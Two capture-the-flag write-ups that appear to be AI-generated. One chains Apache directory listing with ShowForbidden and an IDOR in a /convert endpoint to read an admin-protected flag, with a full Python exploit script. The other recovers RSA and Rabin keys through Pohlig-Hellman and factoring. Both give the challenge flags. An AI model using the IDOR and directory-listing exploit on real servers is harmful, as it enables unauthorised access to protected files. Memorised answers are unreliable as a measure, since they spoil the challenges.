# bad-apple

AI Solveable




An elegant CTF challenge! The core concept involves chaining an intentional Apache misconfiguration with an insecure direct object reference (IDOR) to bypass Basic Authentication and read a protected flag. 

### Challenge Analysis

1. **Directory Indexing (`ShowForbidden`)**
   Taking a look at `httpd-append.conf`, we can see an `Alias` linking `/browse` to the uploads folder `/srv/http/uploads`. 
   ```apache
   Alias /browse /srv/http/uploads
   <Directory /srv/http/uploads>
       Options +Indexes
       DirectoryIndex disabled
       IndexOptions ... ShowForbidden
   ```
   The `Options +Indexes` allows directory listing. However, there is a `<FilesMatch "\.gif$">` block that protects GIFs with HTTP Basic Authentication.
   Because `ShowForbidden` is set in `IndexOptions`, Apache will intentionally list files in the directory index even if they are restricted by authentication or authorization rules. Therefore, by visiting `/browse/admin/`, we can read the randomly generated hex name of the flag: `<HEX>-flag.gif`. 

2. **Insecure Direct Object Reference (`IDOR`)**
   In `wsgi_app.py`, the `/convert` endpoint is responsible for triggering `ffmpeg` to extract the frames from an uploaded `.gif` file.
   ```python
   @app.route('/convert')
   def convert():
       user_id = request.args.get('user_id', 'anonymous')
       filename = request.args.get('filename', '')

       input_path = os.path.join(app.config['UPLOAD_FOLDER'], secure_filename(user_id), filename)
   ```
   Notice that `user_id` is populated via `request.args` (URL parameters) rather than checking the authenticated user's cookie. This allows an attacker to dictate the `user_id`. If we supply `user_id=admin` and set `filename` to the discovered `<HEX>-flag.gif`, the application will process the admin's protected file without any authentication checks. 

3. **Bypassing the `.gif` Regex Protection**
   The extraction process converts the `.gif` format into individual `.png` frames and saves them to the public static directory `/srv/http/static/frames/admin/<HEX>-flag/`.
   Because the generated files end in `.png` and reside in a directory unprotected by the `FilesMatch "\.gif$"` directive, we can freely retrieve them to read the flag.

### Exploitation Steps
1. Navigate to `http://<TARGET_URL>/browse/admin/`.
2. Grab the file name matching `[a-f0-9]{32}-flag.gif` from the directory listing.
3. Make a GET request to `/convert?user_id=admin&filename=<HEX>-flag.gif` to coerce the server into processing the GIF.
4. Retrieve the separated `.png` frames via `http://<TARGET_URL>/?view=<HEX>-flag&view_user_id=admin` or simply pull the first frame directly from `/static/frames/admin/<HEX>-flag/frame_0001.png`.

### Exploit Script

Here is an automated Python solve script:

```python
import requests
import re
import sys

def solve(url):
    target = url.rstrip('/')
    session = requests.Session()

    # Step 1: Hit the Apache Autoindex directory to grab the hidden filename
    browse_url = f"{target}/browse/admin/"
    print(f"[*] Browsing {browse_url} to find the flag file...")
    r = session.get(browse_url)
    
    # Extract the unguessable 16-hex-byte prefix for the flag.gif
    match = re.search(r'([a-f0-9]{32}-flag\.gif)', r.text)
    if not match:
        print("[-] Could not find the flag gif filename in the directory listing.")
        sys.exit(1)
        
    flag_filename = match.group(1)
    safe_name = flag_filename.replace('.gif', '')
    print(f"[+] Found protected flag filename: {flag_filename}")
    
    # Step 2: Trigger the convert IDOR flaw on the admin's file
    convert_url = f"{target}/convert"
    print(f"[*] Triggering frame extraction via IDOR...")
    session.get(convert_url, params={
        'user_id': 'admin',
        'filename': flag_filename
    })
    
    # Step 3: Verify the extracted frames were written successfully
    frames_url = f"{target}/get_frames"
    r = session.get(frames_url, params={
        'user_id': 'admin',
        'gif_name': safe_name
    })
    
    frames = r.json()
    if not frames or 'error' in frames:
        print("[-] Failed to find extracted frames. Conversion might have failed.")
        sys.exit(1)
        
    print(f"[+] Successfully extracted {len(frames)} frames!")
    
    # Step 4: Output URLs
    first_frame = frames[0]
    frame_url = f"{target}/static/frames/admin/{safe_name}/{first_frame}"
    view_url  = f"{target}/?view={safe_name}&view_user_id=admin"
    
    print(f"\n[★] The flag can be found on the first extracted frame here:\n    -> {frame_url}")
    print(f"[★] Or interactively view it in the app's player:\n    -> {view_url}")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <challenge_url>")
        sys.exit(1)
    solve(sys.argv[1])
```


gigem{3z_t0h0u_fl4g_r1t3}

# Hidden Log Factoring

AI Solveable




To solve this challenge, we can break it down into four main steps based on the `generate.py` script:
1. **Solve the Discrete Logarithm Problem (DLP)** to find the 100-bit secret `s`.
2. **Recover the RSA private key $d$** by regenerating the HKDF mask using `s`.
3. **Factor the RSA modulus $n$** using $e$ and $d$.
4. **Decrypt the flag** which was encrypted using Rabin's cryptosystem ($e=2$).

### Step 1: Solving the Discrete Logarithm Problem
We are given $A = g^s \pmod p$, where $s$ is an integer up to $2^{100}$. Since $s$ is small compared to $p$, we should examine the properties of the prime $p$. 

If we factor $p-1$, we will find that it is divisible by a very large power of 2: $2^{101}$. 
Because $s < 2^{100} < 2^{101}$, the value of $s \pmod{2^{101}}$ is exactly $s$. This allows us to use the **Pohlig-Hellman algorithm** on the subgroup of order $2^{101}$ to recover $s$ entirely!

```python
p = 200167626629...
g = 11
A = 442095779518...

# Isolate the subgroup of order 2^101
M = (p - 1) // (2**101)
g_prime = pow(g, M, p)
A_prime = pow(A, M, p)

# Recover s bit by bit
s = 0
cur_A = A_prime
for i in range(101):
    test_val = pow(cur_A, 2**(100 - i), p)
    g_target = pow(g_prime, 2**100, p)
    
    if test_val == 1:
        bit = 0
    elif test_val == g_target:
        bit = 1
        
    s |= (bit << i)
    if bit == 1:
        inv = pow(pow(g_prime, 2**i, p), -1, p)
        cur_A = (cur_A * inv) % p

print(f"Recovered s: {s}")
# Recovered s: 485391067385099231898174017598
```

### Step 2: Recovering the RSA Private Key `d`
We are given `D = d ^ bytes_to_long(hkdf_mask(long_to_bytes(s), d.bit_length() // 8))`. 
Since $n$ is a 1024-bit integer, the bit length of $d$ will be roughly 1010 to 1024. Knowing `s`, we can easily iterate over the small number of possible bit lengths, derive the mask, XOR it with $D$, and verify if the result acts as a valid private exponent (i.e., testing $2^{ed} \equiv 2 \pmod n$).

```python
import hmac, hashlib, math

def hkdf_extract(salt, ikm, hash_fn=hashlib.sha256):
    hash_len = hash_fn().digest_size
    if salt is None: salt = b'\x00' * hash_len
    return hmac.new(salt, ikm, hash_fn).digest()

def hkdf_expand(prk, info, length, hash_fn=hashlib.sha256):
    hash_len = hash_fn().digest_size
    n = math.ceil(length / hash_len)
    okm = b""; t = b""
    for i in range(1, n + 1):
        t = hmac.new(prk, t + info + bytes([i]), hash_fn).digest()
        okm += t
    return okm[:length]

def hkdf_mask(secret, length):
    prk = hkdf_extract(None, secret)
    return hkdf_expand(prk, b"rsa-d-mask", length)

s = 485391067385099231898174017598
D = 947899312610...
n = 710163100058...
e = 65537

s_bytes = s.to_bytes((s.bit_length() + 7) // 8, 'big')

for bit_length in range(1015, 1025):
    mask = hkdf_mask(s_bytes, bit_length // 8)
    d = D ^ int.from_bytes(mask, 'big')
    if pow(2, e * d, n) == 2:
        print(f"Found correct d! (bit length {bit_length})")
        break
```

### Step 3: Factoring the RSA Modulus `n`
Now that we have both the public exponent $e$ and private exponent $d$, we know that $ed - 1$ is a multiple of $\phi(n)$. We can use this to rewrite $ed - 1 = 2^t \cdot r$. By repeatedly squaring a random base $a^r \pmod n$, we can extract non-trivial square roots of $1 \pmod n$, leading to the factors of $n$.

```python
import random

k = e * d - 1
t = 0
r = k
while r % 2 == 0:
    t += 1
    r //= 2

p_rsa, q_rsa = 0, 0
for _ in range(100):
    a = random.randint(2, n - 1)
    x = pow(a, r, n)
    if x in (1, n - 1): continue
    for _ in range(t - 1):
        x_new = pow(x, 2, n)
        if x_new == 1:
            p_rsa = math.gcd(x - 1, n)
            q_rsa = n // p_rsa
            break
        elif x_new == n - 1:
            break
        x = x_new
    if p_rsa != 0: break

print(f"Found p: {p_rsa}")
print(f"Found q: {q_rsa}")
```

### Step 4: Rabin Decryption
If we check `generate.py` closely, $c$ is generated via `pow(bytes_to_long(flag.encode()), 2, n)`, which is essentially the **Rabin cryptosystem** (encryption with an exponent of 2).

Since we have the prime factors of $n$, finding the plaintexts equates to calculating the four possible square roots of $c \pmod n$. We can utilize the Tonelli-Shanks algorithm to find the modular square root over $p\_rsa$ and $q\_rsa$, and combine the roots using the Chinese Remainder Theorem (CRT).

```python
# Assuming tonelli_shanks(c, p) is implemented to return m^2 = c mod p
mp = tonelli_shanks(c % p_rsa, p_rsa)
mq = tonelli_shanks(c % q_rsa, q_rsa)

# Chinese Remainder Theorem to compute the 4 valid square roots modulo N
inv_q = pow(q_rsa, -1, p_rsa)
inv_p = pow(p_rsa, -1, q_rsa)

def crt(r1, r2):
    return (r1 * inv_q * q_rsa + r2 * inv_p * p_rsa) % n

roots =[
    crt(mp, mq),
    crt(p_rsa - mp, mq),
    crt(mp, q_rsa - mq),
    crt(p_rsa - mp, q_rsa - mq)
]

for r in roots:
    try:
        print(r.to_bytes((r.bit_length() + 7) // 8, 'big').decode())
    except UnicodeDecodeError:
        pass
```

One of the four roots prints out the legible ASCII string.

**Flag:** `gigem{100lsb_ed_fact0ring_rab1n_attack_1n_th3_log_3oVAjvoCTGmWg847g9zsNBIyPPWqYdP}`